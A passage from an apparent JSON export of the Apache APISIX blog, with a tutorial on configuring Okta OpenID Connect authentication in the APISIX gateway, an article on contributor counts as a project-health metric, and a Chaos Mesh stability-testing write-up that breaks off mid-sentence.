Airwallex."},{"id":"2021/08/16/using-the-apache-apisix-openid-connect-plugin-for-centralized-authentication","metadata":{"permalink":"/blog/2021/08/16/using-the-apache-apisix-openid-connect-plugin-for-centralized-authentication","source":"@site/blog/2021/08/16/Using-the-Apache-APISIX-OpenID-Connect-Plugin-for-Centralized-Authentication.md","title":"Using the Apache APISIX OpenID Connect Plugin for Okta Centralized Authentication","description":"Using the openid-connect plugin of the cloud-native API gateway Apache APISIX can quickly interface with the centralized authentication solution OKat.","date":"2021-08-16T00:00:00.000Z","formattedDate":"August 16, 2021","tags":[{"label":"Authentication","permalink":"/blog/tags/authentication"},{"label":"Plugins","permalink":"/blog/tags/plugins"},{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":10.25,"truncated":true,"authors":[{"name":"Peter Zhu","url":"https://github.com/starsz","imageURL":"https://avatars.githubusercontent.com/u/25628854?v=4"}],"prevItem":{"title":"Interview with Yang to explore API gateway in Airwallex","permalink":"/blog/2021/08/17/interview-airwallex"},"nextItem":{"title":"Contributors \u2014 The Golden Metric of OpenSource Projects","permalink":"/blog/2021/08/14/contributors-the-golden-metric-of-opensource-projects"}},"content":"> This blog shows the procedures of using Apache APISIX OpenID Connect Plugin for Okta Centralized Authentication. This blog contains conceptual introductions of Apache APISIX and Okta Centralized Authentication, and detailed step-by-step instructions.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introducing Apache APISIX\\n\\n[Apache APISIX](https://github.com/apache/apisix) is a dynamic, real-time, high-performance API gateway, providing rich traffic management. The project offers load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and many useful plugins. In addition, the gateway supports dynamic plugin changes along with hot-plugging. The OpenID Connect plugin for Apache APISIX allows users to replace traditional authentication mode with centralized identity authentication mode via OpenID Connect.\\n\\n## Introducing Okta\\n\\nOkta is a trusted platform to secure every identity. It is a customizable, secure, and drop-in solution to add authentication and authorization services to your applications. More than 10,650 organizations trust Okta\u2019s software and APIs to sign in, authorize and manage users.\\n\\n## What Is Identity Authentication\\n\\nIdentity Authentication verifies a user\'s identity by specific means. We obtain detailed user metadata from the Identity Provider (IdP) to determine whether a user has access to particular resources.\\n\\n## Identity Authentication Modes\\n\\nThere are two main categories of identity authentication: _traditional mode_ and _centralized mode_.\\n\\n### Traditional Authentication Mode\\n\\nIn the traditional authentication mode, each application service needs to support authentication separately, such as accessing the login interface when the user is not logged in. The interface returns a 301 jump page. All application services need to develop the logic to maintain the session and interact with the identity provider for authentication.\\n\\nYou can see the flow of traditional authentication in the figure below.\\n\\nFirst, the user initiates a request, then the gateway receives the request and forwards it to the corresponding application services, and finally, the application services interact with the identity provider to complete the authorization.\\n\\n![traditional authentication work flow](https://static.apiseven.com/202108/1639467045776-715e1805-540b-4cef-87c5-6166e2af43a8.png)\\n\\n### Centralized Identity Authentication Mode\\n\\nUnlike traditional authentication, the centralized identity mode removes user authentication from the application services. Take Apache APISIX as an example; you can see the centralized identity authentication process in the figure below.\\n\\nFirst, the user initiates a request, then the gateway itself takes charge of the user authentication process, interacting with the identity provider and sending them an authorization request. The identity provider returns user identity information (user info). After the gateway identifies the user, it forwards the user identity information (user info) to the services in a request header.\\n\\n![Centralized Identity Authentication work flow](https://static.apiseven.com/202108/1639467122244-d4292436-c5ce-48f6-b1d5-67645f24fbc9.png)\\n\\nCompared with the traditional authentication mode, centralized identity mode has the following advantages:\\n\\n1. Centralized auth simplifies the application development process, and reduces the development application workload and maintenance costs by avoiding the need to repeat the development of authentication code for each application.\\n2. Centralized authentication mode improves business security. At the gateway level, it can intercept unauthenticated requests in time to protect back-end applications.\\n\\n## What is OpenID Connect\\n\\nOpenID Connect (OIDC) is a centralized identity authentication mode. The benefit of using OpenID Connect is that users only need to register and log in with one OpenID Connect identity provider\'s website and use one account\u2019s password information to access different applications. [Okta](https://developer.okta.com/) is a common OpenID Connect identity provider, and the Apache APISIX OpenID Connect plugin supports OpenID. As a result, the plugin can replace traditional authentication mode with centralized identity authentication. In this case, we\u2019re using Okta.\\n\\n### OpenID Authentication Process\\n\\n![OpenID Authentication Process](https://static.apiseven.com/202108/1639467187923-71854ddb-65fd-4a90-8bd0-242b47a8624b.png)\\n\\n1. APISIX initiates an authentication request to the Identity Provider.\\n2. The user logs in and authenticates on the Identity Provider.\\n3. The Identity Provider returns to APISIX with the Authorization Code.\\n4. APISIX requests the Identity Provider with the Code extracted from the request parameters.\\n5. The Identity Provider sends an answer message to APISIX with the ID Token and Access Token.\\n6. APISIX sends the Access Token to the Identity Provider\'s User Endpoint for authentication.\\n7. After passing the authentication, the User Endpoint sends the User Info to APISIX to complete authentication.\\n\\n## How to Configure Okta Authentication Using the Apache APISIX OpenID Connect Plug-in\\n\\nConfiguring Okta authentication using the Apache APISIX OpenID Connect plugin is a simple three-step process that allows you to switch from traditional authentication to centralized identity authentication mode. The following sections describe the steps to configure Okta authentication using the OpenID Connect plug-in for Apache APISIX.\\n\\n### Prerequisites\\n\\nHave an Okta account ready for use.\\n\\n### Step 1: Configuring Okta\\n\\n1. Log in to your Okta account and click \\"Create App Integration\\" to create an Okta application.\\n   ![Create App Integration](https://static.apiseven.com/202108/1639467243454-ac16645a-4a8a-426f-93a2-e840cae3c502.png)\\n2. Select \\"OIDC-OpenID Connect\\" for the Sign-in method, and select \\"Web Application\\" for the Application type.\\n   ![Create a new App Integration](https://static.apiseven.com/202108/1639467299429-0ea741a7-95fd-43b5-a0c4-25a7026e62d2.png)\\n3. Set the redirect URL for login and logout. The \\"Sign-in redirect URIs\\" are links a user can go to after a successful login, and the \\"Sign-out redirect URIs\\" are links a user goes to after a successful logout. In this example, we set both sign-in and sign-out redirect URIs to `http://127.0.0.1:9080/`.\\n   ![Set the redirect URL for login and logout](https://static.apiseven.com/202108/1639467390099-e9594a05-7e78-4f20-a902-7c4ca2c302fb.png)\\n4. After finishing the settings, click \\"Save\\" to save the changes.\\n   ![save the changes](https://static.apiseven.com/202108/1639467449049-628d7796-0d8e-4ed9-8334-5ba7f0fb32f4.png)\\n5. Visit the General page of the application to obtain the following configuration, which is required to configure Apache APISIX OpenID Connect.\\n\\n- Client ID: OAuth client ID, the application ID, which corresponds to client_id and {YOUR_CLIENT_ID} below.\\n- Client secret: OAuth client secret, the application key, which corresponds to client_secret and {YOUR_CLIENT_SECRET} below.\\n- Okta domain: The domain name used by the application, corresponding to {YOUR_ISSUER} below.\\n\\n![obtain configuration](https://static.apiseven.com/202108/1639467501106-d95bf8ad-db47-4918-ac70-424b12488e5b.png)\\n\\n### Step 2: Install Apache APISIX\\n\\n#### Install dependencies\\n\\nThe Apache APISIX runtime environment requires dependencies on NGINX and etcd.\\n\\nBefore installing Apache APISIX, please install dependencies according to the operating system you are using. We provide the dependencies installation instructions for CentOS7, Fedora 31 and 32, Ubuntu 16.04 and 18.04, Debian 9 and 10, and macOS. Please refer to [Install Dependencies](https://apisix.apache.org/docs/apisix/install-dependencies/) for more details.\\n\\n#### Installation via RPM Package (CentOS 7)\\n\\nThis installation method is suitable for CentOS 7; please run the following command to install Apache APISIX.\\n\\n```shell\\nsudo yum install -y https://github.com/apache/apisix/releases/download/2.7/apisix-2.7-0.x86_64.rpm\\n```\\n\\n#### Installation via Docker\\n\\nPlease refer to [Installing Apache APISIX with Docker](https://hub.docker.com/r/apache/apisix).\\n\\n#### Installation via Helm Chart\\n\\nPlease refer to [Installing Apache APISIX with Helm Chart](https://github.com/apache/apisix-helm-chart).\\n\\n#### Installation via source release\\n\\n1. Create a directory named `apisix-2.7`.\\n\\n```shell\\nmkdir apisix-2.7\\n```\\n\\n2. Download Apache APISIX Release source package.\\n\\n```shell\\nwget https://downloads.apache.org/apisix/2.7/apache-apisix-2.7-src.tgz\\n```\\n\\nYou can also download the Apache APISIX release source package from the Apache APISIX website. The [Apache APISIX Official Website - Download Page](https://apisix.apache.org/downloads/) also provides source packages for Apache APISIX, APISIX Dashboard, and APISIX Ingress Controller.\\n\\n3. Unzip the Apache APISIX Release source package.\\n\\n```shell\\ntar zxvf apache-apisix-2.7-src.tgz -C apisix-2.7\\n```\\n\\n4. Install the runtime-dependent Lua libraries.\\n\\n```shell\\n# Switch to the apisix-2.7 directory\\ncd apisix-2.7\\n# Create dependencies\\nmake deps\\n```\\n\\n#### Initializing Dependencies\\n\\nRun the following command to initialize the NGINX configuration file and etcd.\\n\\n```shell\\n# initialize NGINX config file and etcd\\nmake init\\n```\\n\\n### Step 3: Start Apache APISIX and Configure the Corresponding Route\\n\\n1. Run the following command to start Apache APISIX.\\n\\n```shell\\napisix start\\n```\\n\\n2. Create a route and configure the OpenID Connect plugin. The following code example creates a route through the Apache APISIX Admin API, setting the upstream path to httpbin.org, a simple backend service for receiving and responding to requests. The following will use the get page of httpbin.org. Please refer to [http bin get](http://httpbin.org/#/HTTP_Methods/get_get) for more information. For specific configuration items, please refer to the [Apache APISIX OpenID Connect Plugin](https://apisix.apache.org/docs/apisix/plugins/openid-connect/).\\n\\nThe OpenID Connect configuration fields are listed below:\\n\\n| Field                                | Default Value       | Description                                                                                                                                                                                                 |\\n| :----------------------------------- | :------------------ | :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\\n| client_id                            | \\"\\"                  | OAuth client ID.                                                                                                                                                                                            |\\n| client_secret                        | \\"\\"                  | OAuth client secret.                                                                                                                                                                                        |\\n| discovery                            | \\"\\"                  | Service discovery endpoints for identity providers.                                                                                                                                                         |\\n| scope                                | openid              | Scope of resources to be accessed.                                                                                                                                                                          |\\n| relm                                 | apisix              | Specify the WWW-Authenticate response header authentication information.                                                                                                                                    |\\n| bearer_only                          | false               | Whether to check the token in the request header.                                                                                                                                                           |\\n| logout_path                          | /logout             | Log out URI.                                                                                                                                                                                                |\\n| redirect_uri                         | request_uri         | The URI that the identity provider redirects back to, defaulting to the request address.                                                                                                                    |\\n| timeout                              | 3                   | Request timeout time, the unit is defined in seconds.                                                                                                                                                       |\\n| ssl_verify                           | false               | Verify the identity provider\'s SSL certificate.                                                                                                                                                             |\\n| introspection_endpoint               | \\"\\"                  | The URL of the identity provider\'s token authentication endpoint, which will be extracted from the discovery, response if left blank.                                                                       |\\n| introspection_endpoint_auth_method   | client_secret_basic | Name of the authentication method for token introspection.                                                                                                                                                  |\\n| public_key                           | \\"\\"                  | Public key for an authentication token.                                                                                                                                                                     |\\n| token_signing_alg_values_expected    | \\"\\"                  | Algorithm for authentication tokens.                                                                                                                                                                        |\\n| set_access_token_header              | true                | Whether to carry the access token in the request header.                                                                                                                                                    |\\n| access_token_in_authorization_header | false               | Whether to put an access token in the Authorization header. The access token is placed in the Authorization header when this value is set to true and in the X-Access-Token header when it is set to false. |\\n| set_id_token_header                  | true                | Whether to carry the ID token in the X-ID-Token request header.                                                                                                                                             |\\n| set_userinfo_header                  | true                | Whether to carry user information in the X-Userinfo request header.                                                                                                                                         |\\n\\n```shell\\ncurl  -XPOST 127.0.0.1:9080/apisix/admin/routes -H \\"X-Api-Key: edd1c9f034335f136f87ad84b625c8f1\\" -d \'{\\n    \\"uri\\":\\"/*\\",\\n    \\"plugins\\":{\\n        \\"openid-connect\\":{\\n            \\"client_id\\":\\"{YOUR_CLIENT_ID}\\",\\n            \\"client_secret\\":\\"{YOUR_CLIENT_SECRET}\\",\\n            \\"discovery\\":\\"https://{YOUR_ISSUER}/.well-known/openid-configuration\\",\\n            \\"scope\\":\\"openid profile\\",\\n            \\"bearer_only\\":false,\\n            \\"realm\\":\\"master\\",\\n            \\"introspection_endpoint_auth_method\\":\\"client_secret_post\\",\\n            \\"redirect_uri\\":\\"http://127.0.0.1:9080/\\"\\n        }\\n    },\\n    \\"upstream\\":{\\n        \\"type\\":\\"roundrobin\\",\\n        \\"nodes\\":{\\n            \\"httpbin.org:80\\":1\\n        }\\n    }\\n}\'\\n```\\n\\n### Step 4: Access Apache APISIX\\n\\n1. Visit \\"http://127.0.0.1:9080/get\\" and the page is redirected to the Okta login page because the OpenID Connect plugin is enabled.\\n   ![visit Okta login page](https://static.apiseven.com/202108/1639467566395-2a049b96-3b1f-4e74-93f0-d6ea2f52a72e.png)\\n2. Enter the username and password for the user\'s Okta account and click \\"Sign In\\" to log in to your Okta account.\\n3. After successful login, you can access the get page in \\"httpbin.org\\". The \\"httpbin.org/get\\" page will return the requested data with X-Access-Token,X-Id-Token, and X-Userinfo as follows.\\n\\n```sh\\n\\"X-Access-Token\\": \\"******Y0RPcXRtc0FtWWVuX2JQaFo1ZVBvSlBNdlFHejN1dXY5elV3IiwiYWxnIjoiUlMyNTYifQ.***TVER3QUlPbWZYSVRzWHRxRWh2QUtQMWRzVDVGZHZnZzAiLCJpc3MiOiJodHRwczovL3FxdGVzdG1hbi5va3RhLmNvbSIsImF1ZCI6Imh0dHBzOi8vcXF0ZXN0bWFuLm9rdGEuY29tIiwic3ViIjoiMjgzMDE4Nzk5QHFxLmNvbSIsImlhdCI6MTYyODEyNjIyNSwiZXhwIjoxNjI4MTI5ODI1LCJjaWQiOiIwb2ExMWc4ZDg3TzBGQ0dYZzY5NiIsInVpZCI6IjAwdWEwNWVjZEZmV0tMS3VvNjk1Iiwic2NwIjpbIm9wZW5pZCIsInByb2Zpb***.****iBshIcJhy8QNvzAFD0fV4gh7OAdTXFMu5k0hk0JeIU6Tfg_Mh-josfap38nxRN5hSWAvWSk8VNxokWTf1qlaRbypJrKI4ntadl1PrvG-HgUSFD0JpyqSQcv10TzVeSgBfOVD-czprG2Azhck-SvcjCNDV-qc3P9KoPQz0SRFX0wuAHWUbj1FRBq79YnoJfjkJKUHz3uu7qpTK89mxco8iyuIwB8fAxPMoXjIuU6-6Bw8kfZ4S2FFg3GeFtN-vE9bE5vFbP-JFQuwFLZNgqI0XO2S7l7Moa4mWm51r2fmV7p7rdpoNXYNerXOeZIYysQwe2_L****\\",\\n\\"X-Id-Token\\": \\"******aTdDRDJnczF5RnlXMUtPZUtuSUpQdyIsImFtciI6WyJwd2QiXSwic3ViIjoiMDB1YTA1ZWNkRmZXS0xLdW82OTUiLCJpc3MiOiJodHRwczpcL1wvcXF0ZXN0bWFuLm9rdGEuY29tIiwiYXVkIjoiMG9hMTFnOGQ4N08wRkNHWGc2OTYiLCJuYW1lIjoiUGV0ZXIgWmh1IiwianRpIjoiSUQuNGdvZWo4OGUyX2RuWUI1VmFMeUt2djNTdVJTQWhGNS0tM2l3Z0p5TTcxTSIsInZlciI6MSwicHJlZmVycmVkX3VzZXJuYW1lIjoiMjgzMDE4Nzk5QHFxLmNvbSIsImV4cCI6MTYyODEyOTgyNSwiaWRwIjoiMDBvYTA1OTFndHAzMDhFbm02OTUiLCJub25jZSI6ImY3MjhkZDMxMWRjNGY3MTI4YzlmNjViOGYzYjJkMDgyIiwiaWF0IjoxNjI4MTI2MjI1LCJhdXRoX3RpbWUi*****\\",\\n\\"X-Userinfo\\": \\"*****lfbmFtZSI6IlpodSIsImxvY2FsZSI6ImVuLVVTIiwicHJlZmVycmVkX3VzZXJuYW1lIjoiMjgzMDE4Nzk5QHFxLmNvbSIsInVwZGF0ZWRfYXQiOjE2MjgwNzA1ODEsInpvbmVpbmZvIjoiQW1lcmljYVwvTG9zX0FuZ2VsZXMiLCJzdWIiOiIwMHVhMDVlY2RGZldLTEt1bzY5NSIsImdpdmVuX25hbWUiOiJQZXRlciIsIm5hbWUiOiJQZXRl****\\"\\n```\\n\\n**X-Access-Token**: Apache APISIX puts the access token obtained from the user provider into the X-Access-Token request header, optionally via the access_token_in_authorization_header in the plugin configuration Authorization request header.\\n\\n![X-Access-Token](https://static.apiseven.com/202108/1639467626264-980605e2-0b21-4512-9e2c-af71950fcf99.png)\\n\\n**X-Id-Token**: Apache APISIX will get the Id token from the user provider through the base64 encoding into the X-Id-Token request header, you can choose whether to enable this function through the set_id_token_header in the plugin configuration, the default is enabled.\\n\\n![X-Id-Token](https://static.apiseven.com/202108/1639467682902-ada726b8-b46b-460d-8313-ef47b38d13ab.png)\\n\\n**X-Userinfo**: Apache APISIX will get the user information from the user provider and put it into X-Userinfo after encoding it with Base64, you can choose whether to enable this feature through set_userinfo_header in the plugin configuration, it is set to be on by default.\\n\\n![X-Userinfo](https://static.apiseven.com/202108/1639467730566-fc8a8a76-a3aa-4b8e-bb13-505b50839877.png)\\n\\nAs you can see, Apache APISIX will carry the X-Access-Token, X-Id-Token, and X-Userinfo request headers to the upstream. The upstream can parse these headers to get the user IDid information and user metadata.\\n\\nWe have shown the process of building centralized identity authentication from Okta directly into the Apache APISIX Gateway. It is easy to sign up for a free Okta Developer Account to get started. Our approach reduces developer overhead and enables a safe and streamlined experience.\\n\\n## About Okta\\n\\nOkta is a customizable, secure, and drop-in solution to add authentication and authorization services to your applications. Get scalable authentication built right into your application without the development overhead, security risks, and maintenance that come from coding it yourself. You can connect any application in any language or on any stack to Okta and define how you want your users to sign in. Each time a user tries to authenticate, Okta will verify their identity and send the required information back to your app.\\n\\n## About Apache APISIX\\n\\nApache APISIX is a dynamic, real-time, high-performance API gateway. Apache APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more. You can use Apache APISIX to handle traditional north-south traffic, as well as east-west traffic between services. It can also be used as a k8s ingress controller.\\n\\nHundreds of companies worldwide have used Apache APISIX, covering finance, internet, manufacturing, retail, operators, such as NASA, the European Union\u2019s Digital Factory, TravelSky, Tencent, Huawei, Weibo, China Mobile, Taikang, 360 , etc.\\n\\nGithub: https://github.com/apache/apisix\\n\\nWebsite: https://apisix.apache.org"},{"id":"2021/08/14/contributors-the-golden-metric-of-opensource-projects","metadata":{"permalink":"/blog/2021/08/14/contributors-the-golden-metric-of-opensource-projects","source":"@site/blog/2021/08/14/contributors-the-golden-metric-of-openSource-projects.md","title":"Contributors \u2014 The Golden Metric of OpenSource Projects","description":"This article explains why change in the number of contributors is a golden measure of open source projects, and analyzes trends in contributors to Apache APISIX.","date":"2021-08-14T00:00:00.000Z","formattedDate":"August 14, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":4.49,"truncated":true,"authors":[{"name":"Lien","url":"https://github.com/lilien1010","imageURL":"https://avatars.githubusercontent.com/u/3814966?v=4"}],"prevItem":{"title":"Using the Apache APISIX OpenID Connect Plugin for Okta Centralized Authentication","permalink":"/blog/2021/08/16/using-the-apache-apisix-openid-connect-plugin-for-centralized-authentication"},"nextItem":{"title":"Chaos Mesh Helps Apache APISIX Improve System Stability","permalink":"/blog/2021/08/12/chaos-mesh-helps-apache-apisix-improve-system-stability"}},"content":"> According to GitHub\u2019s statistics in 2020, over 60 million new repositories were added, and more than 56 million developers worked on OpenSource projects. By 2025, the number of developers working on OpenSource projects on GitHub is expected to exceed 100 million.\\n\\n\x3c!--truncate--\x3e\\n\\n> Source:\\n> https://github.com/api7/contributor-graph\\n\\nBehind these fast-growing numbers, open source maintainers did a lot of work on propaganda, article, media, Meetups, etc., to attract more developers for their projects, It\u2019s a lot to take in.\\n\\nSo for developers, how can they find out which one is the best fit for their company among the hundreds of projects on GitHub?\\n\\nVarious indicators of open source projects needs to be considered.\\n\\nStar number: This is the most direct indicator, it represents the project has attracted the attention of a number of developers, can reflect the level of marketing of the project. If the project has the financial support of commercial companies, a strong PR team, or a water army to paint Star, then this indicator can easily be distorted.\\n\\nIssue and PR counts: Also GitHub provides the Insights feature, shown in the following image.\\n\\n![Apache APISIX GitHub Insights](https://static.apiseven.com/202108/1639549315114-8bcc2d6d-a67b-48a2-be1e-0831c2441921.png)\\n\\nYou can select the number of new and closed issues and PRs for this open source project, can also filter by period.\\n\\nThe above graph shows the data of Apache APISIX for the last month.\\n\\nGitHub insights provides a great developer perspective, but it\u2019s not perfect: what about the quality of Issue and PR?\\n\\nThe following graph shows the commit frequency statistics of Apache APISIX from it\u2019s first day, which shows that Apache APISIX has maintained a very stable and continuous activities, but this metric is also a bit thin: you can\u2019t see the data of which developers submitted these commits\\n\\n![Apache APISIX commits](https://static.apiseven.com/202108/1639549239894-1406e1d6-ae84-4364-89cd-1b63f6f4cd4b.png)\\n\\nafter reading so many indicators, still you can\u2019t get your answer, don\u2019t you think that choosing an open source project is so complicated? Wait!\\n\\nIs there a \u201cgolden metric\u201d, a metric that cannot be mocked by marketing? A core metric that can tell the truth of a project?\\nAs maintainers and developers of open source projects, we also need such golden metrics to guide us. Therefore, we propose two dimensions, \u201cContributor Growth\u201d and \u201cActive Contributors\u201d, and open source the statistics and analysis process: https://github.com/api7/contributor-graph, you can also search directly through https://www.apiseven.com/zh/contributor-graph. Here is an example from Apache APISIX.\\n\\n## Contributor growth\\n\\n![Apache APISIX contributor growth](https://static.apiseven.com/202108/1639549136527-e477c670-42d3-4764-9432-209c34dd222b.png)\\n\\n## Monthly Active Contributors\\n\\n![Apache APISIX Monthly Active Contributors](https://static.apiseven.com/202108/1639548976021-ed0946ae-eeb2-4dfc-8e15-c3db13f527e0.png)\\n\\nAs you can clearly see from the two tables above, Apache APISIX has seen a steady growth in contributors since its first day, with about 25 contributors participating each month.\\n\\n## Comparison on Multi Repo\\n\\nBoth the \u201cContributor Growth\u201d and \u201cActive Contributors\u201d charts support comparisons across multiple repositories. What\u2019s more, we pull the GitHub API to update the charts on a daily/monthly basis, so your repository can always display real-time contributor data by making a one-time copy using the link we provide.\\n\\nThe contributor growth line plot is based on the date of the first commit by each contributor to the project. The contributor growth line chart allows us to see the growth of the community based on the total number of contributors shown on the GitHub homepage.\\n\\nBy showing line plot for multiple repo in the same chart at the same time, we can also visually compare the development of different communities.\\n\\n![Apache APISIX compare the development of different communities](https://static.apiseven.com/202108/1639548845735-43efcae0-3221-4739-b10f-0d9aaafad3fd.png)\\n\\nIn the graph above, we can see that the number of contributors to Apache APISIX is growing at a very fast rate, and in just two years, the number of contributors has almost caught up with or even surpassed other open source API gateway projects.\\n\\nThe monthly contributor line plot is derived from the number of contributors committing each month.\\n\\nCompared to the contributor growth line plot, the monthly contributors are a better measure of how the community has grown in a short period of time.\\n\\n![Apache APISIX monthly contributors compare](https://static.apiseven.com/202108/1639548683512-d7c7a72b-7ac3-4535-bd1a-f056d05d196b.png)\\n\\nFor example, in the graph above, we can see that Apache APISIX has the highest and most consistent number of monthly contributors of any open source API gateway project.\\n\\nThis explains why Apache APISIX has been able to catch up with its friends in terms of total contributors in such a short period of time since it\u2019s first day of open source.\\n\\n![Apache APISIX monthly contributors](https://static.apiseven.com/202108/1639548241386-6ba96e66-5ab7-468e-9072-6144fb902909.png)\\n\\nThe above graph is comparison of monthly contributors between different MQ community, which is also widely discussed on Twitter. With this chart, we can see that Apache Pulsar is catching up to Apache Kafka in terms of contributors of the month.\\n\\n## Conclusion\\n\\nThe contributor graph is currently used in Apache APISIX, Apache Skywalking, Apache DolphinScheduler, Apache Openwhisk, Apache ShardingSphere, awesome-docker, TiDB docs-dm, and many other open source projects.\\n\\nAlso, we implemented more features, such as adding \u201canonymous\u201d contributors, or adding SVN-side contributors after the project was moved from SVN to GitHub.\\n\\nWhen we talked about the Contributor Graph, not only did we want to use this tool to produce a visual graph of how active the Apache APISIX community is, we also made this little tool open sourced in the hopes that it will help other open source projects.\\n\\nYou are welcome to use the Contributor Graph to track your community activity, and any requests or questions are welcome in the Contributor Graph GitHub repository.\\n\\nYou can visit the Contributor Graph [repository](https://github.com/api7/contributor-graph)."},{"id":"2021/08/12/chaos-mesh-helps-apache-apisix-improve-system-stability","metadata":{"permalink":"/blog/2021/08/12/chaos-mesh-helps-apache-apisix-improve-system-stability","source":"@site/blog/2021/08/12/Chaos-Mesh-Helps-Apache-APISIX-Improve-System-Stability.md","title":"Chaos Mesh Helps Apache APISIX Improve System Stability","description":"This article explains why Chaos Mesh was chosen as the ultimate solution for stability testing, and how to use Chaos Mesh in Apache APISIX.","date":"2021-08-12T00:00:00.000Z","formattedDate":"August 12, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.71,"truncated":true,"authors":[{"name":"Shuyang Wu","url":"https://github.com/Yiyiyimu","imageURL":"https://avatars.githubusercontent.com/u/34589752?v=4"}],"prevItem":{"title":"Contributors \u2014 The Golden Metric of OpenSource Projects","permalink":"/blog/2021/08/14/contributors-the-golden-metric-of-opensource-projects"},"nextItem":{"title":"My first PR in the Apache APISIX community","permalink":"/blog/2021/08/11/interview-tuzhengsong"}},"content":"> This article explains how system stability create some pain points in different scenarios. Then it tells the stories of why the author chose Chaos Mesh as the ultimate solution,and how to use Chaos Mesh in Apache APISIX. In the end, there is also future plans for this solution, including run a chaos test in E2E simulation scenarios, add chaos tests to more Apache APISIX projects, and add features to Chaos Mesh.\\n\\n\x3c!--truncate--\x3e\\n\\n[Apache APISIX](https://github.com/apache/apisix) is a cloud-native, high-performance, scaling microservices API gateway. It is one of the Apache Software Foundation\'s top-level projects and serves hundreds of companies around the world, processing their mission-critical traffic, including finance, the Internet, manufacturing, retail, and operators. Our customers include NASA, the European Union\u2019s digital factory, China Mobile, and Tencent.\\n\\n![Apache APISIX architecture](https://static.apiseven.com/202108/1639466553989-ecae1a31-8121-4390-a830-f386b9b12322.png)\\n\\nAs our community grows, Apache APISIX\u2019s features more frequently interact with external components, making our system more complex and increasing the possibility of errors. To identify potential system failures and build confidence in the production environment, we introduced the concept of Chaos Engineering.\\n\\nIn this post, we\u2019ll share how we use [Chaos Mesh\xae](https://chaos-mesh.org/docs/) to improve our system stability.\\n\\n## Our pain points\\n\\nApache APISIX processes tens of billions of requests a day. At that volume level, our users have noticed a couple of issues:\\n\\n**Scenario #1:**\\n\\nIn Apache APISIX\u2019s configuration center, when unexpectedly high network latency occurs between etcd and Apache APISIX, can Apache APISIX still filter and forward traffic normally?\\n\\n**Scenario #2:**\\n\\nWhen a node in the etcd cluster fails and the cluster can still run normally, an error is reported for the node\u2019s interaction with the Apache APISIX admin API.\\n\\nAlthough Apache APISIX has covered many scenarios through unit, end-to-end (E2E), and fuzz tests in continuous integration (CI), it has not covered the interaction scenario with external components. If the system behaves abnormally, for example, if the network jitters, a hard disk fails, or a process is killed, can Apache APISIX give appropriate error messages? Can it keep running or restore itself to normal operation?\\n\\n## Why we chose Chaos Mesh\\n\\nTo test these user scenarios and to discover similar problems before our product goes into production, our community decided to use Chaos Mesh for chaos testing.\\n\\nChaos Mesh is a cloud-native Chaos Engineering platform that features all-around fault injection methods for complex systems on Kubernetes, covering faults in Pod, the network, file system, and even the kernel. It helps users find weaknesses in the system and ensures that the system can resist out-of-control situations in the production environment.\\n\\nLike Apache APISIX, Chaos Mesh has an active open source community. We know that an active community can ensure stable software use and rapid iteration. This makes Chaos Mesh more attractive.\\n\\n## How we use Chaos Mesh in APISIX\\n\\nChaos Engineering has grown beyond simple fault injection and now forms a complete methodology. To create a chaos experiment, we determined what the normal operation or \\"steady state\\" of our application should be. We then introduced potential problems to see how the system responded. If the problems knocked the application out of its steady state, we fixed them.\\n\\nNow, we\u2019ll take the two scenarios we mentioned to show you how we use Chaos Mesh in Apache APISIX.\\n\\n### Scenario #1\\n\\nWe deployed a Chaos Engineering experiment using the following steps:\\n\\n1. We found metrics to measure whether Apache APISIX is running normally. In the test, the most important method is to use Grafana to monitor the Apache APISIX\u2019s running metrics. We extracted data from Prometheus in CI for comparison. Here, we used the routing and forwarding requests per second (RPS) and etcd connectivity as evaluation metrics. We analyzed the log. For Apache APISIX, we checked Nginx\u2019s error log to determine whether there was an error and whether the error was in line with our expectations.\\n\\n2. We performed a test in the control group. We found that both `create route` and `access route` were successful, and we could connect to etcd. We recorded the RPS.\\n\\n3. We used network chaos to add a five second network latency and then retested. This time, `set route` failed, `get route` succeeded, etcd could be connected to, and RPS had no significant change compared to the previous experiment. The experiment met our expectations.\\n\\n![High network latency occurs between etcd and Apache APISIX](https://static.apiseven.com/202108/1639462804552-8d51872f-3419-4e64-b365-4ef7cbb2a388.png)\\n\\n### Scenario #2\\n\\nAfter we conducted the same experiment as above in the control group, we introduced pod-kill chaos and reproduced the expected error. When we randomly deleted a small number of etcd nodes in the cluster, sometimes APISIX could connect to etcd and sometimes not, and the log printed a large number of connection rejection errors.\\n\\nWhen we deleted the first or third node in the etcd endpoint list, the `set route` returned a result normally. However, when we deleted the second node in the list, the `set route` returned the error \\"connection refused.\\"\\n\\nOur troubleshooting revealed that the etcd Lua API used by Apache APISIX selected the endpoint sequentially, not randomly. Therefore, when we created an etcd client, we bound to only one etcd endpoint. This led to continuous failure.\\n\\nAfter we fixed this problem, we added a health check to the etcd Lua API to ensure that a large number of requests would not be sent to the disconnected etcd node. To avoid flooding the log with errors, we added a fallback mechanism when the etcd cluster was completely disconnected.\\n\\n![An error is reported from one etcd node\u2019s interaction with the Apache APISIX admin API](https://static.apiseven.com/202108/1639462935848-b87400d3-e59b-4e6d-84f9-25c2771d48d3.png)\\n\\n## Our future plans\\n\\n### Run a chaos test in E2E simulation scenarios\\n\\nIn Apache APISIX, we manually identify system weaknesses for testing and repair. As in the open source community, we test in CI, so we don\u2019t need to worry about the impact of Chaos Engineering\u2019s failure radius on the production environment. But the test cannot cover complicated and comprehensive application scenarios in the production environment.\\n\\nTo cover more scenarios, the community plans to use the existing E2E test to simulate more complete scenarios and conduct chaos tests that are more random and cover a larger range.\\n\\n### Add chaos tests to more Apache APISIX projects\\n\\nIn addition to finding more vulnerabilities for Apache APISIX, the community plans to add chaos tests to more projects such as Apache APISIX Dashboard and Apache APISIX Ingress Controller.\\n\\n### Add features to Chaos Mesh\\n\\nWhen we deployed Chaos Mesh, some features were temporarily unsupported. For example, we couldn\u2019t select a service as a network latency target or specify container port injection as network chaos. In the future, the Apache APISIX community will assist Chaos Mesh to add related features.\\n\\nYou\u2019re welcome to contribute to the [Apache APISIX project](https://github.com/apache/apisix) on GitHub. If you are interested in Chaos Mesh and would like to improve it, join its [Slack 